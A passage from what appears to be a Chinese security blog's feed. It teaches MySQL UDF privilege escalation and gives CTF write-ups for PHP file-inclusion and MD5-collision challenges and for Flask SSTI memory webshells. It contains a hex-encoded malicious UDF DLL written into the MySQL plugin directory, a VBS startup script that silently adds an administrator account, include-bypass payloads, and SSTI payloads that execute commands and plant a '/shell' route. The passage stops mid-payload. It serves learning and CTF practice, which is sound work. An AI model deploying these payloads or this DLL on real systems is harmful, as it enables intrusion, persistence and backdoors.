000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 into dumpfile &#x27;E:\\Web\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugins\\udf.dll&#x27;;<br>#linux<br>SELECT * FROM temp_udf INTO DUMPFILE &quot;/usr/lib64/mysql/plugins/udf.so&quot;;<br></code></pre></td></tr></table></figure></li><li><p>引入自定义函数：</p><p>udf常用函数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">sys_eval，执行任意命令，并将输出返回。<br><br>sys_exec，执行任意命令，并将退出码返回。<br><br>sys_get，获取一个环境变量。<br><br>sys_set，创建或修改一个环境变量。<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#win<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br>#kali<br>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;<br></code></pre></td></tr></table></figure></li><li><p>可以查看是否添加成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from mysql.func;<br></code></pre></td></tr></table></figure></li><li><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select sys_eval(&#x27;whoami&#x27;);<br></code></pre></td></tr></table></figure></li><li><p>如果要卸载该函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">drop function sys_eval;<br></code></pre></td></tr></table></figure><p>练习的靶场推荐：vulnhub-Raven:2</p></li></ul></li></ul><h3 id="写文件提权"><a href="#写文件提权" class="headerlink" title="写文件提权"></a>写文件提权</h3><ul><li><p><strong>启动项提权：</strong></p><ul><li><p>概念：</p><p>当Windows的启动项可以被MySQL写入的时候可以使用MySQL将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行</p></li><li><p>条件：</p><ul><li><p>数据库权限为root权限</p></li><li><p>secure_file_priv为空</p></li><li><p>windows主机</p></li></ul></li><li><p>具体操作：</p><ul><li><p>上传脚本：</p><p>上传的位置是在C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup下，getshell之后就要查看是否能够写入文件，如果是可写可读，我们才能上传vbs，(如果数据库是root权限可以直接写入)</p></li><li><p>vbs：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> <span class="hljs-attribute">wsnetwork</span>=CreateObject(&quot;WSCRIPT.NETWORK&quot;) <br><span class="hljs-attribute">os</span>=<span class="hljs-string">&quot;WinNT://&quot;</span>&amp;wsnetwork.ComputerName <br><span class="hljs-built_in">Set</span> <span class="hljs-attribute">ob</span>=GetObject(os) <span class="hljs-string">&#x27;得到adsi接口,绑定 </span><br><span class="hljs-string">Set oe=GetObject(os&amp;&quot;/Administrators,group&quot;) &#x27;</span>属性,admin组 <br><span class="hljs-built_in">Set</span> <span class="hljs-attribute">od</span>=ob.Create(&quot;user&quot;,&quot;yankun&quot;) <span class="hljs-string">&#x27;建立用户 </span><br><span class="hljs-string">od.SetPassword &quot;Admin!@#123&quot; &#x27;</span>设置密码 <br>od.SetInfo <span class="hljs-string">&#x27;保存 </span><br><span class="hljs-string">Set of=GetObject(os&amp;&quot;/yankun&quot;,user) &#x27;</span>得到用户 <br>oe.<span class="hljs-built_in">add</span> os&amp;<span class="hljs-string">&quot;/yankun&quot;</span> <br><span class="hljs-keyword">or</span><br><span class="hljs-built_in">set</span> <span class="hljs-attribute">wshshell</span>=createobject(&quot;wscript.shell&quot;)<br><span class="hljs-attribute">a</span>=wshshell.run(&quot;cmd.exe /c net<span class="hljs-built_in"> user </span>yankun Admin!@#123 /add<span class="hljs-string">&quot;,0)</span><br><span class="hljs-string">b=wshshell.run(&quot;</span>cmd.exe /c net localgroup administrators yankun /add<span class="hljs-string">&quot;,0)</span><br></code></pre></td></tr></table></figure><p>将该用户帐户添加到本地管理员组，赋予该用户管理员权限</p></li><li><p>写入启动项</p><p>找到可写目录后上传vbs.txt,然后连接数据库（因为是root权限），使用mysql语句将vbs.txt的内容写入到C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">load_file</span>(<span class="hljs-params"><span class="hljs-string">&quot;C:/www/vbs.txt&quot;</span></span>) <span class="hljs-keyword">into</span> dumpfile &quot;C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/yankun.bat&quot;</span>;<br></code></pre></td></tr></table></figure><p>接下来只要服务器重启，即可提权成功</p></li></ul></li></ul></li></ul><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><img src="/blog/2025/03/28/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/%E6%8F%90%E6%9D%83/MySQL/note/image-20250328000705999.png" class title="image-20250328000705999">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安洵杯2019</title>
    <link href="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/"/>
    <url>/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>进入题目观察到url有点信息特别是cmd和img</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021518301.png" class title="image-20250301021518301"><p>尝试cmd&#x3D;ls发现被禁止了说明Index.php中有waf禁止了一些参数，具体只有看到index.php源码才能进一步判断</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301021703936.png" class title="image-20250301021703936"><p>接下来就看到了img这个参数看起来有点想是base64编码后的</p><p>当时看到有这个（红色标记的地方）我就一直点没想到后头就真有东西出来</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022115433.png" class title="image-20250301022115433"><p>最后的结果就是555.png，唉当时看到555.png还是没什么思路，当时不晓得为什么还想将444.png和333.png重新按照555.png编码</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022207228.png" class title="image-20250301022207228"><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301022454088.png" class title="image-20250301022454088"><p>结果是没有任何反应，当时就卡住了没有一点思路，后面看到wp才晓得这个时候应该是编码index.php而不是你胡想的参数（现在想来也是，没源码你这个题你根本就做不了，所以一切都要围绕看到index.php的源码前提下）</p><p>观察到有base64，估计index.php的内容经过base64编码了（其实当时，我访问了555.png并且将图片下载了本地然后base64编码了一次就和img src&#x3D;’data’:images&#x2F;gif;base,内容太多了就不沾了，一样了）</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301023113411.png" class title="image-20250301023113411"><p>简单的代码审计主要考点是md5强比较绕过之前做过basectf2024也是考到一样的点，没想到这2019出的题对2024都还有帮助，可见这题是多么的经典。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>没啥好说的直接用工具fastcoll。工具的使用fastcoll.exe -o a a1，生成的两个文件a，a1就是两个不同文件但md5后是相同的最后经过urlencode一次就行（当时我想偷懒直接在Cyber上直接编码，发现传上去的数据怎么也不对，无语😶，最后写了下代码才成功）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;a1&#x27;</span>));<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5F%E7%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%3B%14%1AR%7C%EBA%F2%95%24%A59%15%0Dp%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5q%C5x%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8B%D4%FD%9B%D20%21g%95%D8Cm%AE%93%B5%EC%89%3F%13%DD&amp;b=%EE%AA%03%C7Iz%28%1F%9E%1FX%B0%F3%0C%F7L%24%E5Fg%F7%3BV%CAO69%C6%D308%D2Z%F3%BA%04%ECh-Ek%04g%B2%A2%BB%14%1AR%7C%EBA%F2%95%24%A59%15%0D%F0%13%8C%ED%C5%D7%15%E2%7F%B7%9E%AE%F3%DC%87v%3Ck%F6%AE%BDy%D5qEx%01%BF%0B%EC%08a%16O%C7%9D%8D%09%B0v%3FOw%3B%87%7Ef%09J%8BT%FD%9B%D20%21g%95%D8Cm%AE%93%B5l%89%3F%13%DD<br></code></pre></td></tr></table></figure><p>最后一个过滤了很多就是没过滤dir和要用cat的话反斜杠绕过（\）即可</p><img src="/blog/2025/03/18/CTF/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/wp/image-20250301024747849.png" class title="image-20250301024747849"><p>最后简单总结下：题目虽然不是很难，对我来说唯一难点就是找index.php的源码其他没啥over</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战2024</title>
    <link href="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/"/>
    <url>/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez include"></a>ez include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;starven_secret.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;还想非预期?&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="需要绕过require-once："><a href="#需要绕过require-once：" class="headerlink" title="需要绕过require_once："></a>需要绕过require_once：</h4><p>php的文件包含机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经require_once(‘starven_secret.php’)，已经include的文件不可以再require_once。这里需要绕过require_once，<strong>让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></p><p>知识点：&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接，require_once包含的软链接层数较多时once的hash匹配会直接失效造成重复包含，想到这里，用伪协议配合多级符号链接的办法进行绕过。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></code></pre></td></tr></table></figure><p>第二关：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span> [<span class="hljs-string">&quot;syc&quot;</span>];<br>    <span class="hljs-variable">$hint</span> = <span class="hljs-string">&quot;register_argc_argv = On&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hint都给的这么明显了还不会做?&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], -<span class="hljs-number">4</span>) === <span class="hljs-string">&#x27;.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="利用pearcmd-php文件包含"><a href="#利用pearcmd-php文件包含" class="headerlink" title="利用pearcmd.php文件包含"></a>利用pearcmd.php文件包含</h4><p><code>register_argc_argv</code> 开启的情况下，url中?后面的内容都会传入$_SERVER[‘argv’]这个变量里，并且&amp;是无法分割参数的，真正能有效分割参数的是+号。</p><p>pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定–with-pear才会安装。不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php。</p><img src="/blog/2025/02/04/CTF/%E6%9E%81%E5%AE%A2%E6%8C%91%E6%88%982024/wp/image-20250204200400997.png" class title="image-20250204200400997"><p>我们使用的是config-create命令，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Flask内存🐎</title>
    <link href="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="存在flask-ssti漏洞环境"><a href="#存在flask-ssti漏洞环境" class="headerlink" title="存在flask ssti漏洞环境"></a>存在flask ssti漏洞环境</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    person = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">if</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        person = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">&#x27;&lt;h2&gt;Hello %s!&lt;/h2&gt;&#x27;</span> % person<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="开启了debug模式下的不出网回显"><a href="#开启了debug模式下的不出网回显" class="headerlink" title="开启了debug模式下的不出网回显"></a>开启了debug模式下的不出网回显</h2><p>在debug模式下，报错会带出详细信息，debug模式常见的考点有算pin码进console来命令执行</p><p>其实我们也可以通过手动报错<code>raise Exception()</code>的方式来让我们的命令回显</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read())&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203182013486.png" class title="image-20250203182013486"><h2 id="低版本flask内存🐎环境："><a href="#低版本flask内存🐎环境：" class="headerlink" title="低版本flask内存🐎环境："></a>低版本flask内存🐎环境：</h2><ul><li>flask 2.0.1</li><li>werkzeug 2.2.2</li></ul><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>分析下这个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;__builtins__&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>&#x27;eval&#x27;<span class="hljs-punctuation">]</span>(<br><span class="hljs-string">&quot;app.add_url_rule(</span><br><span class="hljs-string">&#x27;/shell&#x27;, 